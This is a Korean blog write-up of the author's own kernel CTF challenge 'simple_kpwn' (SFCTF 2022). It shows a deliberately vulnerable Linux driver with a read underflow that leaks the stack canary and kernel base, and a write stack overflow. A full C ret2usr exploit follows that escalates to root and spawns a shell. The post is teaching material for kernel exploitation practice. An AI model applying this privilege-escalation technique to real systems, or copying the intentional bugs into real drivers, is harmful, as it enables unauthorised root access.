---
layout: post
title: SFCTF 2022 Winter - simple_kpwn
date: 2022-02-20 08:00:00 +0900
categories: [Security, CTF]
tags: [security factorial, pwnable, linux, sfctf, kernel]
---


V4bel님의 인프런 강의로 커널 해킹을 공부하고, 이 지식을 동아리에 퍼뜨리고 싶어서 커널 문제를 냈다.  
문제 환경은 https://github.com/brwook/binary 에서 다운로드할 수 있다.

---

## 문제 분석

![네놈의 파일을 내 놓아라!](0220-SFCTF-simpleKpwn-writeup/01-connection.png)

Docker 환경을 구성한 뒤에, 해당 주소의 1800 포트로 접속하면, 위와 같은 출력이 나온다. 이는 xinetd를 통해서, 자동으로 실행되는 프로그램을 분석하면 되는데, 그것이 files/test.sh 파일이다.

```bash
#!/bin/bash

...

ROOTFS_NAME="$(mktemp -u XXXXXXXXXX)"
/chall/download.py $ROOTFS_NAME
if [ $? -ne 0 ] ; then
        exit;
fi

...
```

mktemp -u로 무작위 문자열을 받고, 이를 인자로 /chall/download.py를 실행시킨다.

그러면, /chall/download.py를 보자.

```python
#!/usr/bin/env python3
import string
import os
import sys
import mediafire_dl

def main():
    url = input("give me your binary link: ")

    rs = sys.argv[1]
    ROOTFS_NAME = '/chall/' + rs
    os.mkdir(ROOTFS_NAME)
    path = os.path.join(ROOTFS_NAME, "result")

    mediafire_dl.download(url, path, quiet=True)
    return 0

if __name__ == "__main__":
    main()
```

어떻게 하면 "외부에서 만든 바이너리"를 qemu로 실행할 루트 파일 시스템에 넣고 실행시킬 수 있을지를 고민했는데, 마침 좋은 파이썬 스크립트(Juvenal-Yescas/mediafire-dl)가 있어서, 이를 활용했다. mediafire에 파일을 업로드하고 링크를 전달해주면, 그 링크에서 파일을 다운로드하여, 아까 임시로 만든 무작위 문자열을 경로로 해서 저장한다.

그 뒤에는 다운로드한 바이너리를 루트 파일 시스템에 넣은 뒤에, qemu로 실행시킨다.

그럼, 이제 qemu에 준 옵션을 확인해야 할 차례이다.
```bash
qemu-system-x86_64 \
-m 128M \
-kernel ./bzImage \
-initrd /chall/tmp/$ROOTFS_NAME.cpio \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic \
-cpu qemu64 \
-no-reboot
```
KASLR이 걸려 있기 때문에 base 주소를 leak 해야 한다. 그리고, 모듈 드라이버에 canary가 걸려 있기 때문에, 이 또한 우회를 해야 한다. 그 외의 보호 기법은 존재하지 않는다.

그러면, 취약한 부분이 존재하는 드라이버를 보자.

github에서 module/test.c를 확인하면 된다.
```c
static ssize_t test_read(struct file *flip, char __user *buf, size_t count, loff_t *f_pos)
{
    char arr[0x20] = { [0 ... 31] = 0 };
    char *ptr;
    unsigned char len;

    if(count > 32)
    {
        printk("size is too big!\n");
        return -1;
    }

    len = (unsigned char)count;
    len -= 1;
    
    ptr = (char *)kzalloc(len, GFP_KERNEL);
    memcpy(ptr, arr, len);

    if (copy_to_user(buf, ptr, len) != 0)
    {
        printk("copy error\n");
        return -1;
    }

    printk("test_read is done : %x", arr[0]);
    return 0;

}

static ssize_t test_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos)
{
    char arr[0x40] = { [0 ... 63] = 0 };
    size_t len;
    char *ptr;

    if(count > 0x100)
    {
        printk("size is too big!\n");
        count = 0x100;
    }
    len = count;
    
    ptr = (char *)kmalloc(len, GFP_KERNEL);
    if (copy_from_user(ptr, buf, len) != 0)
    {
        printk("copy error\n");
        return -1;
    }
    memcpy(arr, ptr, len);
    printk("test_write is done : %x", arr[0]);
    return 0;
}

...
```


test.ko 모듈이 매번 삽입되는데, 이 모듈은 read와 write 함수가 구현되어 있다.

read 함수에서는 copy_to_user 함수를 통해, 커널 스택에 있는 값을 복사해서 전달하는데, 이때, 실제 복사에 사용되는 크기 len이 count-1의 값을 갖기 때문에, 0을 입력하면 0xFF가 되어, count 크기 조건을 우회하면서도 버퍼를 넘어서 복사된다. -> **Type underflow**

이를 통해서, 커널의 베이스 주소를 구할 수 있고, 또한, 카나리 값도 자연스럽게 얻을 수 있을 것이다.

write 함수에서는 단순히 버퍼의 크기보다 더 많은 값을 입력할 수 있기 때문에, RIP 조작이 가능하다.

---

## 익스플로잇

```c
// gcc -o exp exp.c -no-pie -static -masm=intel
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>

void *(*commit_creds)(void *);
void *(*prepare_kernel_cred)(void *);

struct register_val {
    uint64_t user_rip;
    uint64_t user_cs;
    uint64_t user_rflags;
    uint64_t user_rsp;
    uint64_t user_ss;
} rv;

void shell(void) {
    execl("/bin/sh", "sh", NULL);
}

void backup_rv(void) {
    asm("mov rv+8, cs;"
        "pushf; pop rv+16;"
        "mov rv+24, rsp;"
        "mov rv+32, ss;"
       );
    rv.user_rip = &shell;
}

void payload(void) {
    commit_creds(prepare_kernel_cred(0));
    asm("swapgs;"
        "mov %%rsp, %0;"
        "iretq;"
        : : "r" (&rv));
}

int main()
{
    int fd;
    uint64_t buf[0x100/8] = {0, };
    if ((fd = open("/dev/test", O_RDWR)) == -1)
    {
        printf("open error\n");
        return -1;
    }
    read(fd, buf, 0);
    
    uint64_t canary = buf[4];
    uint64_t kbase = buf[7] - 0x20daf8;
    prepare_kernel_cred = kbase + 0x943e0;
    commit_creds = kbase + 0x94140;

    backup_rv();
    memset(buf, 0x30, 0x100);
    buf[8]  = canary;
    buf[13] = &payload;
    write(fd, buf, sizeof(buf));
    
    close(fd);
    return 0;
}
```
익스플로잇의 흐름은 위에서 설명한 취약점들을 터뜨리면 된다.

read 함수에서는 0을 count로 넣어서, canary와 커널의 base 주소를 가져오고,

write 함수에서는 BOF를 통해, RET에 유저 공간에 있는 payload함수의 주소로 덮어서 권한 상승을 수행했다.

write 하기 전에 실행시키는 backup_rv 함수는 현재 유저 공간에 있는 context를 rv 구조체에 삽입한다. RET를 덮어서 payload 함수를 수행하는 것은, 커널 공간에서 유저 공간으로 회귀하는 과정이 조작된 것이기 때문에 수동으로 환경을 유저 공간으로 맞춰줘야 한다. 그때 사용하는 것이 바로 rv 구조체이고, backup_rv 함수는 그 구조체를 초기화한다.

payload 함수는 권한 상승을 수행하고, 이전에 초기화한 rv 구조체를 통해, 유저 공간으로 환경을 맞춰준다. prepare_kernel_cred(0)은 root의 cred 구조체의 주소를 반환하고, commit_creds 함수는 인자로 받은 cred 구조체로 현재 태스크의 cred를 바꾼다. 즉, commit_creds(prepare_kernel_cred(0))은 현재 태스크의 권한을 루트 권한으로 바꾸는 함수인 것이다.

이후에 있는 인라인 어셈블리는 swapgs, iretq, 그리고 rsp를 아까 backup_rv 함수에서 초기화한 rv 구조체의 주소로 맞춰주는 준다. 앞선 opcode 중 하나인 swapgs는 GS 레지스터를 복구하는 명령이고, iretq는 rsp를 기준으로 rip, cs, rflags, rsp, ss 레지스터를 복구하는 명령이다. 이 둘은 커널 패닉을 일으키지 않고, 커널 공간에서 유저 공간으로 돌아갈 때 필요한 명령들이라고 이해하고 있으면 되겠다. (사실, swapgs는 각 잡고 공부 좀 해야 제대로 알 수 있을 것 같다.)

인라인 어셈블리에서 쓰인 콜론(:)은 확장된 인라인 어셈블리에서 사용되는 것이다. 첫 번째 콜론 뒤는 출력, 두 번째 콜록 뒤는 입력, 마지막 콜론 뒤는 asm 명령 중에 변화되는 레지스터를 지칭한다. 즉, 해당 레지스터에 값을 저장하지 말라고 컴파일러에게 명시하는 것이다.

위에서는 두 번째 콜론 뒤, 즉, 입력으로 "r" (&rv)를 사용하였다. 여기서 "r"은 범용 레지스터(a, b, c, d, S, D) 중 아무거나 쓰라는 것을 의미하고, 해당 레지스터에 전역 구조체 변수 rv의 주소를 담으라는 뜻이다. 그리고, asm 중에 사용된 %0은 입/출력으로 들어온 인자의 인덱스를 의미하는 것으로 0부터 1씩 증가하게 된다. 정리하자면, 범용 레지스터 중 하나에 rv의 주소를 담아서, 해당 레지스터에 있는 값을 rsp에 복사하는 명령인 것이다.

그렇게 payload 함수가 커널에서 실행되면, 권한 상승을 수행한 뒤에, 커널 패닉 없이 유저 공간으로 돌아간 뒤에, 미리 rip에 넣어 둔 shell 함수를 실행함으로써, 루트 권한을 획득하게 된다!

![권한 상승 성공!](0220-SFCTF-simpleKpwn-writeup/02-shell.png)